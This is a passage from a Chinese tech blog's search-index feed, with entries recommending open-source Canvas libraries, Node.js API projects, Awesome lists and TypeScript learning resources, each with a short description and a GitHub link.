href="https://github.com/nuxt-community/awesome-nuxt">https://github.com/nuxt-community/awesome-nuxt</a><br /><strong>●Awesome NestJS：</strong><a href="https://github.com/nestjs/awesome-nestjs">https://github.com/nestjs/awesome-nestjs</a><br /><strong>●Awesome Web Security：</strong><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a><br /><strong>●Awesome Font ：</strong><a href="https://github.com/FortAwesome/Font-Awesome">https://github.com/FortAwesome/Font-Awesome</a><br /><strong>●Awesome Mac：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Awesome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas 项目</title>
      <link href="/2023/06/30/frontend/collection/projects/canvas-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/canvas-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在 Web 开发中，Canvas 是一个强大的绘图工具，可以实现各种有趣的交互效果和动态图形。本文将盘点 10 个基于 Canvas 的开源项目，旨在为提供开发灵感和思路，以便更好地探索并应用 Canvas 技术！<br><a name="ADI2i"></a></p><h2 id="canvas-editor"><a href="#canvas-editor" class="headerlink" title="canvas-editor"></a>canvas-editor</h2><p>canvas-editor 是一个基于 canvas&#x2F;svg 的富文本编辑器，类似于 word。其具有以下特点：<br />● <strong>所见即所得</strong>：类 word 可分页，所见即所得<br />● <strong>轻量的数据结构</strong>：一段 JSON 即可呈现复杂样式<br />● <strong>丰富的功能</strong>：支持常见富文本操作、表格、水印、控件、公式等<br />● <strong>使用方便</strong>：官方发布核心 npm 包，菜单栏、工具栏可自行维护<br />● <strong>灵活的开发机制</strong>：通过接口可获取生命周期、事件回调、自定义右键菜单、快捷键等<br />● <strong>完全类型化的 API</strong>：灵活的 API 和完整的 TypeScript 类型</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685498254941-735fbf63-0239-4806-ad5a-cd0ec03fd688.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685498254941-735fbf63-0239-4806-ad5a-cd0ec03fd688.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Hufe921/canvas-editor">https://github.com/Hufe921/canvas-editor</a><br><a name="aGqGo"></a></p><h2 id="lucky-canvas"><a href="#lucky-canvas" class="headerlink" title="lucky-canvas"></a>lucky-canvas</h2><p>基于 TS + Canvas 开发的【大转盘 &#x2F; 九宫格 &#x2F; 老虎机】抽奖插件，一套源码适配多端框架 JS &#x2F; Vue &#x2F; React &#x2F; Taro &#x2F; UniApp &#x2F; 微信小程序等，奖品 &#x2F; 文字 &#x2F; 图片 &#x2F; 颜色 &#x2F; 按钮均可配置，支持同步 &#x2F; 异步抽奖，概率前 &#x2F; 后端可控，自动根据 dpr 调整清晰度适配移动端。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435064284-5b2b7963-649b-4dee-b4d9-29dc00e8f722.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435064284-5b2b7963-649b-4dee-b4d9-29dc00e8f722.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/buuing/lucky-canvas">https://github.com/buuing/lucky-canvas</a><br><a name="nEfQY"></a></p><h2 id="Excalidraw"><a href="#Excalidraw" class="headerlink" title="Excalidraw"></a>Excalidraw</h2><p>Excalidraw 是一款开源的在线白板工具，主要用于创建简单直观的图形和草图，支持共享和协作。以下是 Excalidraw 的主要特点：<br />● 简单易用：具有直观简单的界面和操作方式，用户可以轻松创建和编辑图形，并实现各种设计需求。<br />● 实时协作：支持多人实时协作，用户可以与其他人一起编辑和讨论，在线完成协作任务。<br />● 自由绘制和对象管理：提供了自由绘制、文本框、箭头、线段、矩形、椭圆、图标等多种基本对象，并支持对这些对象进行移动、复制、旋转、缩放、对齐等操作，帮助用户实现更为精细的设计。<br />● 高度灵活性：支持导出为 SVG、PNG、Clipboard 等多种格式，方便用户进行分享和保存。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435218432-2da00b0b-cb03-48c0-9106-80f4b2b9b485.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435218432-2da00b0b-cb03-48c0-9106-80f4b2b9b485.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/excalidraw/excalidraw">https://github.com/excalidraw/excalidraw</a><br><a name="sK2Uj"></a></p><h2 id="fireworks-js"><a href="#fireworks-js" class="headerlink" title="fireworks-js"></a>fireworks-js</h2><p>fireworks-js 是一个基于 Canvas 的动画库，用于在网页上制作烟花特效。该库的特点如下：<br />● 轻量级：fireworks-js 体积小，不依赖其他库或框架，易于集成。<br />● 易于使用：只需几行代码就可以创建出炫目的烟花特效，具有良好的可定制性和可扩展性。<br />● 动画效果逼真：fireworks-js 采用粒子系统实现烟花特效，能够模拟出逼真的爆炸、飞溅和星光等效果。<br />● 浏览器兼容性良好：可以在主流的现代浏览器上运行，支持多种设备和分辨率，包括移动端。</p><p>该项目提供了多种框架的实现：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434066197-1c6d1514-ceb7-4bb8-8283-b84125b9d648.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434066197-1c6d1514-ceb7-4bb8-8283-b84125b9d648.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/crashmax-dev/fireworks-js">https://github.com/crashmax-dev/fireworks-js</a><br><a name="NmWJk"></a></p><h2 id="Luckysheet"><a href="#Luckysheet" class="headerlink" title="Luckysheet"></a>Luckysheet</h2><p>Luckysheet ，一款纯前端基于 Canvas 的类似 excel 的在线表格，功能强大、配置简单、完全开源。其具有以下功能：<br />● <strong>格式</strong>：样式、条件格式、文本对齐和旋转、文本截断、溢出、自动换行、多种数据类型、单元格分割样式<br />● <strong>单元格</strong>：拖放、填充柄、多选、查找和替换、定位、合并单元格、数据验证<br />● <strong>行和列</strong>：隐藏、插入、删除行或列、冻结和拆分文本<br />● <strong>操作</strong>：撤消、重做、复制、粘贴、剪切、热键、格式刷、拖放选择<br />● <strong>公式和函数</strong>：内置、远程和自定义公式<br />● <strong>表</strong>：过滤、排序<br />● <strong>增强功能</strong>：数据透视表、图表、评论、协同编辑、插入图片、矩阵计算、截图、复制为其他格式、EXCEL 导入导出等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/gif/1500604/1685434303162-7e2ad244-39f9-4036-b47f-8d657bd4b98a.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/gif/1500604/1685434303162-7e2ad244-39f9-4036-b47f-8d657bd4b98a.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/dream-num/Luckysheet">https://github.com/dream-num/Luckysheet</a><br><a name="xYJi1"></a></p><h2 id="x-spreadsheet"><a href="#x-spreadsheet" class="headerlink" title="x-spreadsheet"></a>x-spreadsheet</h2><p>x-spreadsheet 是一个基于 Web(es6) canvas 构建的轻量级 Excel 开发库。其具有以下特点：<br />● 轻量级：完整功能，包含所有插件。代码打包后只不到 200kb<br />● 易于使用：如果只需要一些简单的功能可以零配置<br />● 数据驱动：调整数据非常的简单快捷<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434452541-55b294dc-ddef-490f-80d5-7af56a3054f7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434452541-55b294dc-ddef-490f-80d5-7af56a3054f7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/myliang/x-spreadsheet">https://github.com/myliang/x-spreadsheet</a><br><a name="hNb4E"></a></p><h2 id="rough"><a href="#rough" class="headerlink" title="rough"></a>rough</h2><p>Rough.js 是一个轻量级的（大约 8k），基于 Canvas 的可以绘制出粗略的手绘风格的图形库。该库提供绘制线条、曲线、弧线、多边形、圆形和椭圆的基础能力，同时支持绘制 SVG 路径。除此之外，Rough.js 还提供了大量的可自定义选项，可以调整线宽、线条颜色、填充颜色、字体样式、背景颜色等，以使图形更加个性化。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434512240-51c1a587-a1ae-4418-8a38-11f3d24d1866.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434512240-51c1a587-a1ae-4418-8a38-11f3d24d1866.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/rough-stuff/rough">https://github.com/rough-stuff/rough</a><br><a name="zwuGz"></a></p><h2 id="Signature-Pad"><a href="#Signature-Pad" class="headerlink" title="Signature Pad"></a>Signature Pad</h2><p>Signature Pad 是一个基于 Canvas 实现的签名库，用于绘制签名。它可以在所有现代桌面和移动浏览器中使用，不依赖于任何外部库。Signature Pad 提供了许多可自定义的选项，如笔画颜色、粗细、背景色、画布大小、签名格式等，可以轻松实现不同的签名风格和功能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434734272-60b5604b-6f5f-4b86-978f-48bf3bb3c5ea.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434734272-60b5604b-6f5f-4b86-978f-48bf3bb3c5ea.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/szimek/signature_pad">https://github.com/szimek/signature_pad</a><br><a name="QyqzP"></a></p><h2 id="canvas-confetti"><a href="#canvas-confetti" class="headerlink" title="canvas-confetti"></a>canvas-confetti</h2><p>canvas-confetti 是一个基于 Canvas 的库，用于在 Web 页面中实现炫酷的彩色纸屑动画效果。它实现了高性能、流畅的纸屑动画效果，同时兼容各种现代浏览器。提供了许多可自定义的选项，如纸屑颜色、形状、数量、速度、角度、发射器位置等，可以轻松实现不同的纸屑效果。并支持多种触发方式，如点击按钮、滚动页面、定时触发等，可根据需求进行定制。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434982733-7eff5cb4-96ae-4542-8fb9-47c7d9619fc4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685434982733-7eff5cb4-96ae-4542-8fb9-47c7d9619fc4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/catdad/canvas-confetti">https://github.com/catdad/canvas-confetti</a><br><a name="EXjTj"></a></p><h2 id="QRCanvas"><a href="#QRCanvas" class="headerlink" title="QRCanvas"></a>QRCanvas</h2><p>QRCanvas 是一个基于 canvas 的 JavaScript 二维码生成工具。其具有以下特点：<br />● 仅依赖 canvas，兼容性好<br />● 简单，仅仅是需要一些数据的配置<br />● 定制化功能丰富<br />● 支持 Node.js<br />● 方便在 React 和 Vue 中使用<br />● 支持所有主流的浏览器<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435772506-ae1f373c-735c-4efe-8daf-f44a915b79de.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1685435772506-ae1f373c-735c-4efe-8daf-f44a915b79de.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><strong>Github：</strong><a href="https://github.com/gera2ld/qrcanvas">https://github.com/gera2ld/qrcanvas</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js项目</title>
      <link href="/2023/06/30/frontend/collection/projects/node.js-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/node.js-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h2><p>API 一个基于 Node.js 的网易云音乐 API 服务。通过该项目，开发者可以方便地对网易云音乐进行各种操作，例如搜索歌曲、获取歌曲信息和评论、获取用户信息和播放列表等等。该项目提供了完整的文档供开发者参考，提供了超过 250 个接口。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602765518-64b49734-267c-4a6c-8c7f-a1ac8811bb91.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602765518-64b49734-267c-4a6c-8c7f-a1ac8811bb91.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Binaryify/NeteaseCloudMusicApi">https://github.com/Binaryify/NeteaseCloudMusicApi</a></p><h2 id="饿了么-API"><a href="#饿了么-API" class="headerlink" title="饿了么 API"></a>饿了么 API</h2><p>一个基于 Node.js + MongoDB + Express + Mongoose + Vue + Element UI 的前后端分离的 Web 应用项目，是一个仿照饿了么的外卖点餐系统。整个项目分为两部分：前台项目接口、后台管理接口，共 60 多个。涉及登陆、注册、添加商品、商品展示、筛选排序、购物车、下单、用户中心等，构成一个完整的流程。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603001637-bedb862b-3bd5-493b-8d23-ccb449d4a753.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603001637-bedb862b-3bd5-493b-8d23-ccb449d4a753.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/bailicangdu/node-elm">https://github.com/bailicangdu/node-elm</a></p><h2 id="QQ-音乐-API"><a href="#QQ-音乐-API" class="headerlink" title="QQ 音乐 API"></a>QQ 音乐 API</h2><p>基于 Express + Axios 的 QQ 音乐接口 nodejs 版，开发者可以方便地对 QQ 音乐进行各种操作，例如搜索歌曲、获取歌曲信息和评论、获取用户信息和播放列表等。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603140212-81db8baa-28b4-4591-8b6f-26eb56f99cd4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603140212-81db8baa-28b4-4591-8b6f-26eb56f99cd4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/jsososo/QQMusicApi">https://github.com/jsososo/QQMusicApi</a></p><h2 id="Spotify-API"><a href="#Spotify-API" class="headerlink" title="Spotify API"></a>Spotify API</h2><p>一个可以运行在 Node.JS 和浏览器上的 Spotify Web API 通用封装库&#x2F;客户端，使用了 browserify&#x2F;webpack&#x2F;rollup 进行打包。该项目提供了音乐数据、音乐简介、搜索、播放列表操作、音乐库、个性化、浏览、播放器、跟随、身份验证等功能 API。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603425777-d2e71696-0b99-4ff5-9269-9fcaddcc4a26.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603425777-d2e71696-0b99-4ff5-9269-9fcaddcc4a26.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/thelinmichael/spotify-web-api-node">https://github.com/thelinmichael/spotify-web-api-node</a></p><h2 id="ChatGPT-API"><a href="#ChatGPT-API" class="headerlink" title="ChatGPT API"></a>ChatGPT API</h2><p>一个基于 OpenAI 的 ChatGPT 生成式对话模型的 Web API。该项目使用 TypeScript 和 Express.js 构建。通过该项目，开发者可以快速地搭建自己的聊天机器人，以及实现其他基于 ChatGPT 的自然语言处理应用。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603768502-65bd5ace-5f72-4656-b6ed-ca407858887a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603768502-65bd5ace-5f72-4656-b6ed-ca407858887a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/transitive-bullshit/chatgpt-api">https://github.com/transitive-bullshit/chatgpt-api</a></p><h2 id="SpaceX-REST-API"><a href="#SpaceX-REST-API" class="headerlink" title="SpaceX REST API"></a>SpaceX REST API</h2><p>一个开源的 SpaceX 公司的 RESTful API，该项目提供了关于 SpaceX 发射、船只、火箭、任务等各种数据的接口。该项目的目的是为开发者提供 SpaceX 公司的数据，方便开发者进行相关应用的开发。同时，该项目还提供了文档和使用示例，方便开发者快速上手使用。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603892902-44c35db0-e8eb-45c3-9cfd-af86eb164893.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682603892902-44c35db0-e8eb-45c3-9cfd-af86eb164893.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/r-spacex/SpaceX-API">https://github.com/r-spacex/SpaceX-API</a></p><h2 id="Node-js-最佳实践"><a href="#Node-js-最佳实践" class="headerlink" title="Node.js 最佳实践"></a>Node.js 最佳实践</h2><p>Node.js 最佳实践指南，旨在帮助开发者编写更加健壮、安全和易于维护的 Node.js 应用程序。它提供了一系列的最佳实践、原则和代码示例，涵盖了从工程结构、代码组织、错误处理和日志记录等方面的内容。</p><p>该项目通过将最佳实践分类为 8 个模块，为开发者提供了一个全面的指南，帮助编写高质量的 Node.js 代码。这些模块包括：<br />● 项目结构实践 <br />● 异常处理实践 <br />● 编码规范实践 <br />● 测试和总体质量实践<br />● 进入生产实践<br />● 安全实践<br />● 性能实践<br />●Docker 实践</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602036272-eff507f4-e8bc-4528-a611-331eb2fb7768.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602036272-eff507f4-e8bc-4528-a611-331eb2fb7768.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/goldbergyoni/nodebestpractices">https://github.com/goldbergyoni/nodebestpractices</a></p><h2 id="Node-js-调试指南"><a href="#Node-js-调试指南" class="headerlink" title="Node.js 调试指南"></a>Node.js 调试指南</h2><p>一个面向 Node.js 调试的开源项目，旨在帮助开发者更好地理解和利用 Node.js 的调试工具。该项目提供了一组示例代码和指南，覆盖了 Node.js 内置的调试器、Chrome DevTools 和 VSCode 等常见的调试工具。</p><p>通过学习该项目，开发者可以了解 Node.js 调试器的基本用法，包括如何使用 –inspect 命令行参数启动 Node.js 应用程序，以及如何使用 Chrome DevTools 或者 VSCode 连接到 Node.js 调试会话。项目还提供了一些进阶内容，例如如何使用调试器进行内存分析和 CPU 分析等。</p><p>此外，该项目中的示例代码非常实用，包含了许多调试场景下的代码示例，例如如何在调试过程中打断点、如何使用条件断点、如何在调试期间修改变量值、如何跟踪异步代码等。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602236591-9ba6f8a8-80c8-4eb2-b661-127f78f35f47.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602236591-9ba6f8a8-80c8-4eb2-b661-127f78f35f47.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/nswbmw/node-in-debugging">https://github.com/nswbmw/node-in-debugging</a></p><h2 id="Nodejs-Roadmap"><a href="#Nodejs-Roadmap" class="headerlink" title="Nodejs-Roadmap"></a>Nodejs-Roadmap</h2><p>一个社区驱动的学习资源，旨在帮助开发者系统学习成为现代化的 Node.js 开发者。通过该项目，开发者可以获得一份完整的学习路线图，学习从基础到进阶的全部内容。该路线图覆盖了从 Node.js 基础知识、模块和包管理、异步编程和事件循环、Web 开发、网络协议和安全、性能和可伸缩性等方面的内容。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602529228-fa1716a4-5ece-4b35-b0fa-397b8b1985ba.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682602529228-fa1716a4-5ece-4b35-b0fa-397b8b1985ba.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/kamranahmedse/developer-roadmap">https://github.com/kamranahmedse/developer-roadmap</a></p><h2 id="Awesome-Node-js"><a href="#Awesome-Node-js" class="headerlink" title="Awesome Node.js"></a>Awesome Node.js</h2><p>一个开源的收录 Node.js 生态系统各种资源的项目，其中包括了 Node.js 框架、库、工具、文档和文章等各个方面，是一个非常受欢迎和权威的 Node.js 资源收集项目。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682604002719-4d16a332-45d4-4e59-ad9f-60d2252fe304.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1682604002719-4d16a332-45d4-4e59-ad9f-60d2252fe304.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript资源</title>
      <link href="/2023/06/30/frontend/collection/projects/typescript-zi-yuan/"/>
      <url>/2023/06/30/frontend/collection/projects/typescript-zi-yuan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="1-TypeScript-官方文档"><a href="#1-TypeScript-官方文档" class="headerlink" title="1. TypeScript 官方文档"></a>1. TypeScript 官方文档</h2><p>TypeScript 官方文档，提供了中文版本。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664442631327-8350ba70-300f-4cd2-96ba-56c1b3f60865.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664442631327-8350ba70-300f-4cd2-96ba-56c1b3f60865.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/microsoft/TypeScript">https://github.com/microsoft/TypeScript</a></p><h2 id="2-学习-TypeScript"><a href="#2-学习-TypeScript" class="headerlink" title="2. 学习 TypeScript"></a>2. 学习 TypeScript</h2><p>可能是中国最好的 TypeScript 入门到进阶系统教程。</p><p><img 